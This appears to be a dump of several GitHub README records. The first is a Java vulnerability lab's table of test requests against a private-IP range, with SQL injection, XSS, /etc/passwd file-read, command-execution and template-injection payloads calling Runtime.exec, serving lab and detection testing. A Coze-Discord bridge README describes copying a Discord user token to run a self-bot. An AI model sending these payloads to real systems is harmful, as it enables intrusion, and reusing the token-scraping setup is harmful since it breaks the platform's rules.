| fastjson1_2_80_attack | fastjson-1.2.80反序列漏洞 | POST | http://192.168.0.9:9976/fastjson1.2.80-process | 攻击 |
| druid_unauthorized | druid未授权漏洞 | GET | http://192.168.0.9:9997/druid | 攻击 |
| actuator2_unauthorized | SpringBoot Actuator未授权访问漏洞2.X | GET | http://192.168.0.9:9995/actuator | 攻击 |
| actuator1_unauthorized | SpringBoot Actuator未授权访问漏洞1.X | GET | http://192.168.0.9:9993/trace | 攻击 |
| sql_injection_id_attack | SQL注入-mybatics-数字 | GET | http://192.168.0.9:9991/users/1'/ | 攻击 |
| sql_injection_ids_attack | SQL注入-mybatics-数组 | GET | http://192.168.0.9:9991/users/ids/?ids=1,2,3' | 攻击 |
| sql_injection_like_attack | SQL注入-mybatics-like模糊匹配 | GET | http://192.168.0.9:9991/users/name?name=A' | 攻击 |
| sql_injection_strs_attack | SQL注入-mybatics-字符串数组 | GET | http://192.168.0.9:9991/users/names?names=Alice&names=Bob' | 攻击 |
| sql_injection_orderby_attack | SQL注入-mybatics-排序 | GET | http://192.168.0.9:9991/users/sort?orderByColumn=name&orderByDirection=asc' | 攻击 |
| sql_injection_Optional_attack | SQL注入-Optional<String> | GET | http://192.168.0.9:9991/users/findByOptionalUsername?username=test' | 攻击 |
| sql_injection_Object_attack | SQL注入-Object<String> | POST | http://192.168.0.9:9991/users/get_name_object | 攻击 |
| sql_injection_Annotation_attack | SQL注入-MyBatis注解方式 | GET | http://192.168.0.9:9991/users/by-username?name=test' | 攻击 |
| sql_injection_lombok_attack | SQL注入-lombok | POST | http://192.168.0.9:9991/users/lombok | 攻击 |
| sql_injection_hsqldb_attack | SQL注入-hsqldb | GET | http://192.168.0.9:9989/hsqldb?username=1' | 攻击 |
| sql_injection_Hibernate_attack | SQL注入-Hibernate | GET | http://192.168.0.9:9988/Hibernate_injection?username=foobar' OR (SELECT COUNT(*) FROM User)>=0 OR 'foobar'=' | 攻击 |
| xss_reflect_attack | 反射型XSS漏洞 | GET | http://192.168.0.9:9991/xss_reflect?name=<script>alert(123)</script> | 攻击 |
| xss_storage_attack | 存储型XSS漏洞 | GET | http://192.168.0.9:9991/xss_storage?name=<script>alert(123)</script> | 攻击 |
| xss_dom_attack | DOM XSS漏洞 | POST | http://192.168.0.9:9991/xss_dom | 攻击 |
| file_upload_attack | 任意文件上传漏洞 | POST | http://192.168.0.9:9991/file_upload | 攻击 |
| file_read_attack | 任意文件读取漏洞 | GET | http://192.168.0.9:9991/file_read?filePath=/etc/passwd | 攻击 |
| file_write_attack | 任意文件写入漏洞 | GET | http://192.168.0.9:9991/file_write?fileName=test.txt&data=test | 攻击 |
| file_download_attack | 任意文件下载漏洞 | GET | http://192.168.0.9:9991/file_download?fileName=../pom.xml | 攻击 |
| file_delete_attack | 任意文件删除漏洞 | GET | http://192.168.0.9:9991/file_delete?fileName=test.txt | 攻击 |
| runtime_command_execute | 命令执行漏洞-runtime | GET | http://192.168.0.9:9991/runtime_command_execute?command=whoami | 攻击 |
| process_builder_command_execute | 命令执行漏洞-ProcessBuilder | GET | http://192.168.0.9:9991/process_builder_command_execute?command=whoami | 攻击 |
| crlf_injection_attack | CRLF注入 | GET | http://192.168.0.9:9991/crlf_injection?name=%0D%0ASet-Cookie: sessionid=123456 | 攻击 |
| spel_expression_attack | SPEL表达式攻击 | GET | http://192.168.0.9:9991/spel_expression?input=T(java.lang.Runtime).getRuntime().exec('whoami') | 攻击 |
| ssrf_openStream_attack | SSRF攻击-openStream | GET | http://192.168.0.9:9991/ssrf_openStream?url=https://www.baidu.com | 攻击 |
| ssrf_openConnection_attack | SSRF攻击-openConnection | GET | http://192.168.0.9:9991/ssrf_openConnection?url=http://www.baidu.com | 攻击 |
| ssrf_requestGet_attack | SSRF攻击-requestGet | GET | http://192.168.0.9:9991/ssrf_requestGet?url=https://www.baidu.com | 攻击 |
| ssrf_okhttp_attack | SSRF攻击-okhttp | GET | http://192.168.0.9:9991/ssrf_okhttp?url=https://www.baidu.com | 攻击 |
| ssrf_defaultHttpClient_attack | SSRF攻击-defaultHttpClient | GET | http://192.168.0.9:9991/ssrf_defaultHttpClient?url=https://www.baidu.com | 攻击 |
| ssti_velocity_attack | SSTI攻击-velocity | GET | http://192.168.0.9:9991/ssti_velocity?content=%23set (%24exp %3d ""exp"")%3b%24exp.getClass().forName(""java.lang.Runtime"").getRuntime().exec(""whoami"") | 攻击 |
| ssti_freemarker_attack | SSTI攻击-freemarker | GET | http://192.168.0.9:9991/ssti_freemarker?templateContent=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22bash%20-c%20whoami%22%29%20%7D | 攻击 |
| xxe_saxparserfactory_attack | XXE-saxparserfactory | POST | http://192.168.0.9:9991/xxe_saxparserfactory | 攻击 |
| xxe_xmlreaderfactory_attack | XXE-xmlreaderfactory | POST | http://192.168.0.9:9991/xxe_xmlreaderfactory | 攻击 |
| xxe_saxbuilder_attack | XXE-saxbuilder | POST | http://192.168.0.9:9991/xxe_saxbuilder | 攻击 |
| xxe_saxreader_attack | XXE-saxreader | POST | http://192.168.0.9:9991/xxe_saxreader | 攻击 |
| xxe_documentbuilderfactory_attack | XXE-documentbuilderfactory | POST | http://192.168.0.9:9991/xxe_documentbuilderfactory | 攻击 |
| xxe_documentbuilderfactory_xinclude_attack | XXE-documentbuilderfactory_xinclude | POST | http://192.168.0.9:9991/xxe_documentbuilderfactory_xinclude | 攻击 |
| OpenRedirector_ModelAndView_attack | URL重定向漏洞-ModelAndView | GET | http://192.168.0.9:9991/OpenRedirector_ModelAndView?url=https://www.baidu.com | 攻击 |
| OpenRedirector_sendRedirect_attack | URL重定向漏洞-sendRedirect | GET | http://192.168.0.9:9991/OpenRedirector_sendRedirect?url=https://www.baidu.com | 攻击 |
| OpenRedirector_lacation_attack | URL重定向漏洞-location | GET | http://192.168.0.9:9991/OpenRedirector_lacation?url=https://www.baidu.com | 攻击 |
| swagger-ui_attack | swagger-ui-未授权访问漏洞 | GET | http://192.168.0.9:9991/swagger-ui.html | 攻击 |
| xxe_wxpay_attack | 微信支付XXE漏洞 | POST | http://192.168.0.9:9974/wxpay-xxe | 攻击 |
| xstream_CVE-2019-10173 | xstream 反序列化漏洞(CVE-2019-10173) | POST | http://192.168.0.9:9973/CVE-2019-10173 | 攻击 |
| jackson-databind_CVE-2019-12384 | jackson-databind 反序列化漏洞(CVE-2019-12384) | GET | http://192.168.0.9:9971/CVE-2019-12384 | 攻击 |
| log4j2_normal | Log4j2 远程代码执行漏洞（CVE-2021-44228） | POST | http://192.168.0.9:9998/log4j2 | 正常 |
| fastjson_1_2_24_normal | fastjson-1.2.24反序列漏洞 | POST | http://192.168.0.9:9999/fastjson1.2.24-process | 正常 |
| fastjson1_2_25_normal | fastjson-1.2.25-1.2.41反序列漏洞-disableAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.25-process | 正常 |
| fastjson1_2_41_normal | fastjson-1.2.25-1.2.41反序列漏洞-setAutoTypeSupport | POST | http://192.168.0.9:9987/fastjson1.2.41-process-setAutoTypeSupport | 正常 |
| fastjson1_2_42_normal | fastjson-1.2.42反序列漏洞 | POST | http://192.168.0.9:9986/fastjson1.2.42-process | 正常 |
| fastjson1_2_43_normal | fastjson-1.2.43反序列漏洞 | POST | http://192.168.0.9:9985/fastjson1.2.43-process | 正常 |
| fastjson1_2_45_normal | fastjson-1.2.45反序列漏洞 | POST | http://192.168.0.9:9984/fastjson1.2.45-process | 正常 |
| fastjson1_2_59_normal | fastjson-1.2.59反序列漏洞(1.2.5 <= 1.2.59) | POST | http://192.168.0.9:9983/fastjson1.2.59-process | 正常 |
| fastjson1_2_60_normal | fastjson-1.2.60反序列漏洞(1.2.5 <= 1.2.60) | POST | http://192.168.0.9:9982/fastjson1.2.60-process | 正常 |
| fastjson1_2_61_normal | fastjson-1.2.61反序列漏洞 | POST | http://192.168.0.9:9981/fastjson1.2.61-process | 正常 |
| fastjson1_2_62_normal | fastjson-1.2.62反序列漏洞 | POST | http://192.168.0.9:9980/fastjson1.2.62-process | 正常 |
| fastjson1_2_66_normal | fastjson-1.2.66反序列漏洞 | POST | http://192.168.0.9:9979/fastjson1.2.66-process | 正常 |
| fastjson1_2_67_normal | fastjson-1.2.67反序列漏洞 | POST | http://192.168.0.9:9978/fastjson1.2.67-process | 正常 |
| fastjson1_2_68_normal | fastjson-1.2.68反序列漏洞 | POST | http://192.168.0.9:9977/fastjson1.2.68-process | 正常 |
| fastjson1_2_80_normal | fastjson-1.2.80反序列漏洞 | POST | http://192.168.0.9:9976/fastjson1.2.80-process | 正常 |
| fastjson1_2_83_normal | fastjson-1.2.83-反序列漏洞 | POST | http://192.168.0.9:9975/fastjson1.2.83-process | 正常 |
| sql_injection_hsqldb_normal | SQL注入-hsqldb | GET | http://192.168.0.9:9989/hsqldb?username=1' | 正常 |
| sql_injection_lombok_normal | SQL注入-lombok | POST | http://192.168.0.9:9991/users/lombok | 正常 |
| sql_injection_longlist_normal | SQL注入-longlist | POST | http://192.168.0.9:9991/users/findByIds | 正常 |
| sql_injection_longint_normal | SQL注入-longint | POST | http://192.168.0.9:9991/users/getUserByUId | 正常 |
| sql_injection_jpaone_normal | SQL注入-jpaone | GET | http://192.168.0.9:9991/users/jpaone?name=test | 正常 |
| sql_injection_jpawithAnnotations_normal | SQL注入-jpawithAnnotations | GET | http://192.168.0.9:9991/users/jpawithAnnotations?name=test | 正常 |
| sql_injection_Annotation_normal | SQL注入-MyBatis注解方式 | GET | http://192.168.0.9:9991/users/by-username?name=test | 正常 |
| sql_injection_id_normal | SQL注入-mybatics-数字 | GET | http://192.168.0.9:9991/users/1/ | 正常 |
| sql_injection_ids_normal | SQL注入-mybatics-数组 | GET | http://192.168.0.9:9991/users/ids/?ids=1,2,3 | 正常 |
| sql_injection_like_normal | SQL注入-mybatics-like模糊匹配 | GET | http://192.168.0.9:9991/users/name?name=A | 正常 |
| sql_injection_strs_normal | SQL注入-mybatics-字符串数组 | GET | http://192.168.0.9:9991/users/names?names=Alice&names=Bob | 正常 |
| sql_injection_orderby_normal | SQL注入-mybatics-排序 | GET | http://192.168.0.9:9991/users/sort?orderByColumn=name&orderByDirection=asc | 正常 |
| sql_injection_Optional_normal | SQL注入-Optional<String> | GET | http://192.168.0.9:9991/users/findByOptionalUsername?username=test | 正常 |
| sql_injection_Object_normal | SQL注入-Object<String> | POST | http://192.168.0.9:9991/users/get_name_object | 正常 |
| xss_reflect_normal | 反射型XSS漏洞 | GET | http://192.168.0.9:9991/xss_reflect?name=1 | 正常 |
| xss_dom_normal | DOM XSS漏洞 | POST | http://192.168.0.9:9991/xss_dom | 正常 |
| file_download_normal | 任意文件下载漏洞 | GET | http://192.168.0.9:9990/file_download?fileName=test.log | 正常 |
| ReDos_normal_1 | ReDoS攻击-(a+)+ | GET | http://192.168.0.9:9991/testReDos1?input=1 | 正常 |
| ReDos_normal_2 | ReDoS攻击-([a-zA-Z]+)* | GET | http://192.168.0.9:9991/testReDos2?input=1 | 正常 |
| ReDos_normal_3 | ReDoS攻击-(a\|aa)+ | GET | http://192.168.0.9:9991/testReDos3?input=1 | 正常 |
| ReDos_normal_4 | ReDoS攻击-(a\|a?)+ | GET | http://192.168.0.9:9991/testReDos4?input=1 | 正常 |
| ReDos_normal_5 | ReDoS攻击-(.*a){20} | GET | http://192.168.0.9:9991/testReDos5?input=1 | 正常 |
| file_write_normal | 任意文件写入漏洞 | GET | http://192.168.0.9:9990/file_write?fileName=test.log&data=test | 正常 |
| runtime_command_execute_normal | 命令执行漏洞-Runtime | GET | http://192.168.0.9:9990/runtime_command_execute?command=ls | 正常 |
| process_builder_command_normal | 命令执行漏洞-ProcessBuilder | GET | http://192.168.0.9:9990/process_builder_command_execute?command=ls | 正常 |
| spel_expression_normal | SPEL表达式攻击 | GET | http://192.168.0.9:9990/spel_expression?input=1 | 正常 |
| ssrf_openStream_normal | SSRF攻击-openStream | GET | http://192.168.0.9:9990/ssrf_openStream?url=http://example.com | 正常 |
| ssrf_openConnection_normal | SSRF攻击-openConnection | GET | http://192.168.0.9:9990/ssrf_openConnection?url=http://example.com | 正常 |
| ssrf_requestGet_normal | SSRF攻击-requestGet | GET | http://192.168.0.9:9990/ssrf_requestGet?url=http://example.com | 正常 |
| ssrf_okhttp_normal | SSRF攻击-okhttp | GET | http://192.168.0.9:9990/ssrf_okhttp?url=http://example.com | 正常 |
| ssrf_defaultHttpClient_normal | SSRF攻击-defaultHttpClient | GET | http://192.168.0.9:9990/ssrf_defaultHttpClient?url=http://example.com | 正常 |
| OpenRedirector_ModelAndView_normal | URL重定向漏洞-ModelAndView | GET | http://192.168.0.9:9990/OpenRedirector_ModelAndView?url=https://example.com | 正常 |
| OpenRedirector_sendRedirect_normal | URL重定向漏洞-sendRedirect | GET | http://192.168.0.9:9990/OpenRedirector_sendRedirect?url=https://example.com | 正常 |
| OpenRedirector_lacation_normal | URL重定向漏洞-location | GET | http://192.168.0.9:9990/OpenRedirector_lacation?url=https://example.com | 正常 |
| druid_sqlwall | druid-SQL防火墙 | GET | http://192.168.0.9:9997/druid_sql?id=1 | 误报 |


## 参考开发代码

- https://github.com/vulhub/vulhub
- https://github.com/l4yn3/micro_service_seclab
- https://github.com/ffffffff0x/JVWA
- https://github.com/mamba-2021/myjavavul
- https://github.com/zhlu32/range_java_micro_service_seclab
- https://rasp.baidu.com/doc/install/testcase.html
- https://github.com/lemono0/FastJsonParty/
- https://github.com/roottusk/vapi

## Star History Chart

[![Star History Chart](https://api.star-history.com/svg?repos=lokerxx/JavaVul&type=Date)](https://star-history.com/#lokerxx/JavaVul&Date)

## 待进行

- [x] cas-client xxe（漏洞和修复）
- [ ] SQL注入传 order by 参数, 白名单列表（误报）
",0,0,1,apache-2.0,0.0
mercyblitz/java-zsxq,main,"# 小马哥 Java 知识星球
",0,0,1,apache-2.0,0.0
ShafiqSadat/IPTVTelegramBot,master,"# IPTV Telegram Bot

IPTV Telegram Bot is a bot that lets you watch IPTV streams right in Telegram App. IPTV stands for Internet Protocol Television, which is a way of delivering live TV channels over the internet. With this bot, you can send the name of the channel you want to watch, and the bot will respond with available streams to watch. There are over 60000+ online streams from all over the world, covering various genres and languages.

![Screenshot of IPTV Telegram Bot](https://i.imgur.com/XVsp1Nd.png)

![Screenshot of IPTV Telegram Bot](https://raw.githubusercontent.com/ShafiqSadat/IPTVTelegramBot/master/screenshots/1.gif)
## How to use

- Clone this repository or download the zip file.
- Install the requirements using `mvn install`.
- Create a bot using [@BotFather](https://t.me/BotFather) and get the bot token.
- In BotFather, send the ""/setmenubutton"" command, select your bot, and send the following link: ```https://iptvnator.vercel.app/```. Then, provide a name for the button, such as ""Open Player.""
- Rename example_local.properties into local.properties under /src/main/resources/example_local.properties
- Edit the local.properties file and enter your bot token and username.
- Run the Main.java file using `java Main`.
- Start your bot and enjoy watching IPTV streams.

## Credits

- IPTV API: [iptv-org/iptv](https://github.com/iptv-org/iptv)
- Telegram API: [rubenlagus/TelegramBots](https://github.com/rubenlagus/TelegramBots)
- IPTV Player: [4gray/iptvnator](https://github.com/4gray/iptvnator)

## License

This project is licensed under the MIT License - see the [LICENSE] file for details.

## Contributing

If you want to contribute to this project, you are welcome to do so. Please follow these steps:

- Fork this repository and create a new branch for your feature or bug fix.
- Write your code and test it locally.
- Commit and push your changes to your forked repository.
- Create a pull request with a clear description of your changes and a link to the issue (if any) that you are addressing.
- Wait for the maintainer to review and merge your pull request.

## Contact

If you have any questions, suggestions, or feedback, you can contact me via:

- Email: ShafiqSadat2012@gmail.com
- Telegram: [@Shafiq](https://t.me/Shafiq)

## License
IPTVTelegramBot is licensed under the MIT License. The terms are as follows:

```
The MIT License (MIT)

Copyright (c) 2024 Shafiq Sadat

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
",1,0,1,mit,0.0
sasmithx/Chat_Application_Socket_Progrmming,master,"![Logo](https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Client-Server-Network-Model.jpg)

# PLAY TECH PVT LTD.

This project is a simple chat application built using Java Socket programming. It features a client-server architecture, enabling real-time text and image communication between multiple clients. The application also includes an emoji picker, allowing users to send emojis in their chat messages.

## Table of Contents

- Features
- Technologies Used
- Setup
- How to Run
- Usage
- Screenshots
- Contributing
- License
- Contact

## Features

- Real-time text communication between clients.
- Ability to send and receive images.
- Emoji picker for sending emojis in chat.
- User authentication based on a simple name validation.
- Responsive and intuitive user interface.

## Technologies Used

- **Java:** Core programming language.
- **JavaFX:** Used for the graphical user interface.
- **Socket Programming:** Used for client-server communication.
- **FXML:** For defining the UI layout.
- **CSS:** For styling the UI components.

## Setup

To set up the project locally, follow these steps:

**1.** **Clone the repository:**
```bash
https://github.com/sasmithx/Chat_Application_Socket_Progrmming.git
```
**2.** **Import the project:**

- Open your favorite IDE (like IntelliJ IDEA, Eclipse, or NetBeans).
- Import the project as a Maven/Gradle project.
- Ensure that the JavaFX library is properly configured in your IDE.

**3.** **Configure JavaFX:**

- Download JavaFX SDK if you haven't already.
- Configure the JavaFX SDK path in your project settings.

## How to Run

**1.** **Run the Server:**

- Run the Server.java file to start the server.
- The server will start listening on port 5003 by default.


**2.** **Run the Client:**

- Run the ClientController.java file to start the client.
- Enter your username in the login screen.
- Start chatting with other connected clients.

## Usage

- **Login:** Enter a username (between 4 and 15 alphabetic characters) to join the chat.
- **Send a Message:** Type your message in the input field and press enter or click the send button.
- **Send an Image:** Click on the image icon to select and send an image.
- **Send an Emoji:** Click on the emoji icon to select and send an emoji.
- **Receive Messages:** All incoming messages, images, and emojis will be displayed in the chat window.

## Screenshots

<img src=""https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Screenshots/Screenshot%202024-08-22%20184323.png"" width=""600px"" height=""auto"">

<img src=""https://github.com/sasmithx/Chat_Application_Socket_Progrmming/blob/master/src/main/resources/assests/Screenshots/Screenshot%202024-08-22%20184245.png"" width=""600px"" height=""auto"">

## Contributing

Contributions are welcome! Please fork this repository and submit a pull request with your changes.


## License

This project is licensed under the MIT License - see the [MIT License](LICENSE)  file for details.

## 
<br>

<div align=""center""> 
<a href=""https://github.com/sasmithx"" target=""_blank""><img src = ""https://img.shields.io/badge/GitHub-000000?style=for-the-badge&logo=github&logoColor=white""></a>
<a href=""https://git-scm.com/"" target=""_blank""><img src = ""https://img.shields.io/badge/Git-000000?style=for-the-badge&logo=git&logoColor=white""></a>
<a href=""https://maven.apache.org/download.cgi"" target=""_blank""><img src = ""https://img.shields.io/badge/Maven-000000?style=for-the-badge&logo=apachemaven&logoColor=white""></a>
<a href=""https://www.jetbrains.com/idea/download/?section=windows"" target=""_blank""><img src = ""https://img.shields.io/badge/intellij-000000?style=for-the-badge&logo=intellijidea&logoColor=white""></a>
<a href=""https://www.asus.com/lk/"" target=""_blank""><img src = ""https://img.shields.io/badge/asus%20laptop-000000?style=for-the-badge&logo=asus&logoColor=white""
<a href=""https://ubuntu.com/"" target=""_blank""><img src = ""https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white""
                                                
</div>

<br>

<p align=""center"">
  &copy; 2024 Sasmith Manawadu
</p>

",0,0,1,mit,0.0
NekoCurit/Coze-Discord-Bridge,main,"﻿<div align=""center"">

# Coze-Discord-Bridge

_免费的ChatGPT Turo 128k API_

_通过 `discord bot`调用 `coze 托管 discord bot`实现`免费使用GPT-4作为API`_

_觉得有点用的话 别忘了点个🌟_

</div>

## 停止维护

已停止维护 推荐个类似的

[Coze-Discord-Proxy](https://github.com/deanxv/coze-discord-proxy)

## 截图
![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/24e4304b-a5f7-4baa-9559-8c01f9a935b3)

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/285d33e5-6898-4324-8f9c-8842f3a3912c)

## 功能

注:是最新源代码里支持的功能 不是Release里的 要看Release的往前翻Commit api文档 配置文件同样
- [X] 适配`NextChat`,`LobeChat`等可以修改OpenAPI URL的AI平台
- [X] HTTP/HTTPS API支持
- [X] 支持文生图(需`coze`配置`DALL·E3`/`DALL·E2`插件)返回图片url
- [X] 支持图生文(需`coze`配置`GPT4V`插件)(发送的文本消息中携带图片url/自己上传base64图片)
- [x] 支持对话隔离
- [X] 对话支持流式返回
- [X] 支持和`openai`对齐的对话接口(`v1/chat/completions`)
- [X] 支持和`openai`对齐的图像生成接口(`v1/images/generations`)
- [X] 突破Discord Bot 2k字消息长度上限
- [X] 定时活跃机器人 自定义活跃间隔 避免bot因为太久未互动而离线
- [ ] 导入此jar进行二次开发 [::80%]
- [ ] WebUI
- [ ] 多个Bot 负载均衡
- [ ] Token计数

大饼很甜,苦了的只是猫猫

## 部署准备材料

1.一个Windows/Linux/...机器 (只要能运行java,能联网就行)  需要安装java (推荐jdk17 已知jdk8及以下版本不兼容)

2.一个代理服务器/材料一的机器在国外

3.一个手机号/Google账号

4.一个Discord账号

## 部署

1.下载Release或者自行构建

2.运行一遍 `java -jar CozeDiscordBridge-xxxxxx.jar` 如果一切正常,你可以在运行目录看到  `Config.yml` 配置文件

3.打开配置文件,进行编辑

````
#Github: https://github.com/catx-feitu/coze-discord-bridge
Bots:
   - #访问密钥 留空或default 表示无需密钥 通过不同的密钥链接不同的bot
     Key: ""default""
     #登录协议
     Protocol: ""discord""
     #Discord user token
     #打开Discord(推荐注册小号 因为UserBot 本身Discord就禁止) 按下F12打开开发者模式
     #点进网络 随便选择一个 复制请求头中的 Authorization 粘贴在这里
     Token: """"
     #[仅Discord可用]创建频道时使用的父频道 (也可以理解成 分组) 打开开发者模式 右键就可以看到ID 为空关闭
     CreateChannel_Category: """"
     #Coze Bot所处的服务器ID 打开Discord开发者模式 右键服务器复制过来即可
     Server_id: """"
     #接入Coze的Bot id 邀请进服务器在用户列表右键 复制用户ID 过来即可
     CozeBot_id: """"

#配置是否启用代理  代理类型 HTTP 或 SOCKS 常用于中国大陆机器部署
UsingProxy: false
ProxyIP: 127.0.0.1
ProxyPort: 8080
ProxyType: HTTP

#API端口设置为0关闭 如果HTTP和HTTPS都监听失败则无法启动
#API端口 默认8092 curl http://127.0.0.1:8092/Ping
APIPort: 8092
#API HTTPS 端口 默认8093 curl https://127.0.0.1:8093/Ping
APISSLPort: 8093
......
````
首先你要在[Discord开发者平台](https://discord.com/developers/)创建一个Application

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/41310da4-5db7-46df-946d-de642b64f985)

点击Bot 然后获取Token 复制保存到其它地方

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/bf45bbd4-0039-4723-b781-38854b607bbc)

往下滑动 开启下面三个按钮 随后点击保存

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/dd4a278d-9bac-45b4-b871-f3c92a136172)

点击Oauth 勾选Bot 然后往下滑勾选Administrator (省事 如果注重安全性那么请确保 链接到Coze的bot能收发和编辑消息 链接到Coze-Discord-Birdge的bot能收发消息和创建删除子频道)

复制下方生成的URL

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/8bb919a9-0dd5-480e-8062-2733b5ef5084)
之后第二个Bot相同的操作 这样你就有了两个Token 两个URL

打开Discord App(网页版亦可) 创建一个服务器

然后依次打开两个URL 把两个bot都添加进服务器

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/1c72bf00-dfc7-48fe-adb8-fcfcbf05ad95)

点击左下角设置打开Discord设置

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/2310f3c6-1060-4b18-a026-0feaaf1a82e0)



之后登录[Coze AI Studio](https://www.coze.com/)创建一个Bot
![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/9de286bf-d6bd-43a4-a2a0-8566dd706d84)

之后可以配置Bot 添加插件(要能AI画图必须添加) 调整GPT设置之类的(Dialog round = 对话轮数  推荐拉满) 最后点击右上角Publish

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/cf33dfef-33f6-420c-8473-aecddb789432)

输入 Token 点击保存 然后Publish

ps:Changelog必填 随便写即可 如果你有强迫症的话那..不太建议..

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/f5b32f9e-8f9b-484a-afcd-7a935904dd45)

如果配置正确你应该能看到托管到Coze的机器人上线了

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/580a331d-713f-4686-961e-8c3169bcbee4)

下滑 找到高级设置 开启开发者模式

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/ca33a63f-6de7-44d5-b6bb-b13162712056)

点击左上角复制服务器ID

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/d84f4363-a0f6-4f05-abc8-798f5742794a)

点击右侧复制Bot 用户ID

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/9b560037-9d4d-4324-892d-dbb8bcc90bc3)

在Config中保存这两个ID

````
     ......
     #Coze Bot所处的服务器ID 打开Discord开发者模式 右键服务器复制过来即可
     Server_id: ""xxxxxx""
     #接入Coze的Bot id 邀请进服务器在用户列表右键 复制用户ID 过来即可
     CozeBot_id: ""xxxxxx""
     ......
````

回到Discord页面 按下F12打开浏览器开发者页面

点击网络(Network) 随便选择一个 复制请求头 Authorization

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/7d802fb5-4c62-458f-83da-c0b7770fd6d1)

保存到配置中
````
     ......
     #Discord user token
     #打开Discord(推荐注册小号 因为UserBot 本身Discord就禁止) 按下F12打开开发者模式
     #点进网络 随便选择一个 复制请求头中的 Authorization 粘贴在这里
     Token: ""xxxxxxxxxxxxxxx""
     ......
````
4.再次运行 `java -jar CozeDiscordBridge-xxxxxx.jar` 如下显示则正常  如果您是使用的是Windows且控制台编码为GBK 请先执行`chcp 65001`

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/803bfe60-39d5-42d5-b1b3-7aaf932a2808)

ps:第一次启动报错 `读取 cache_names.json 失败` 正常 直接忽略即可

5.最后可通过curl或者其它工具测试 如果服务器内你的账号自动向机器人提问 随后机器人回答就是部署成功

![image](https://github.com/catx-feitu/Coze-Discord-Bridge/assets/108512490/a87d04ac-5c52-4929-bb7c-ff62bd2fde65)

## (可选)keepalive

因为Discord/Coze问题 当bot很长时间不互动会离线 遇到这种情况需要去Coze手动重新登录 很麻烦

因此 你可以通过编辑配置开启keepalive功能

它可以自动与Coze托管的bot对话 当累计到一段时间bot没有被互动过

````
......
# Keepalive 通过定时与Coze托管的bot互动防止因为太久未发言而被强制下限
# 内置定时器执行周期 单位分钟  设置 0 关闭  关闭后也可以通过api调用keepalive
Keepalive_timer: 0
# 只有大于指定分钟未发言Coze托管的bot才执行keepalive 单位分钟
Keepalive_maxIntervalMinutes: 720
# keepalive发送消息所在频道
Keepalive_sendChannel: ""keepalive""
# keepalive发送消息内容
Keepalive_sendMessage: ""keepalive""
````

当关闭内置定时器时 你也可以通过访问终结点`/api/keepalive`来执行keepalive任务

## API文档

[传送门](https://github.com/catx-feitu/Coze-Discord-Bridge/wiki)

````

## 免责申明

本项目中的任何代码/构建产品仅供学习使用

使用即代表您承担一切滥用所造成的后果

作者不保证软件绝对稳定 如果有能力请使用[Coze API](https://www.coze.com/open)

",6,0,2,mit,1.0
OpenCubicChunks/CubicChunks3,1.20.4,"# Cubic Chunks 3

## Not yet usable or functional, don't try.

Rewrite of the previous rewrite, targeting NeoForge/MC 1.20.4. 

This Minecraft mod extends Minecraft height and depth to be nearly infinite (at least a million blocks).

For the most up-to-date information about this mod and its related mods, as well as the newest downloads, please join us on the [**Cubic Chunks Discord**](https://discord.gg/kMfWg9m).

### Cubic Chunks (CC) - Links:

Github - [Cubic Chunks - 1.20.4 and above](https://github.com/OpenCubicChunks/CubicChunks3)  
Github - [Cubic Chunks - 1.12.2 and lower](https://github.com/OpenCubicChunks/CubicChunks)

### Cloning the repository

Note: you need git installed to do the following:
```
git clone --recursive
```
You need a git submodule for the project to compile.
If you don't yet have the submodule but already cloned the repository:
```
git submodule update --init --recursive
```

To get latest version of the submodule:
```
git submodule update --recursive --remote
```

### .git-blame-ignore-revs
Configure commits to be ignored for git blame:

```shell
git config blame.ignoreRevsFile .git-blame-ignore-revs
```

### Running the game

If running with IntelliJ, ensure that `io.github.opencubicchunks.[folder name].main` is selected, not `[folder name].main`:

![image](https://github.com/OpenCubicChunks/CubicChunks2/assets/18627001/0d88d6b5-0944-44f1-9461-fc90daef5766)

### Contributing

#### PR Guidelines
- All mixin methods and fields _**must**_ have a `cc_` prefix // todo automate this check in gh workflows.
- If a class is significantly modified with mixins, it _**must**_ have documentation explaining:
	- The original vanilla behaviour, can mention important fields/methods.
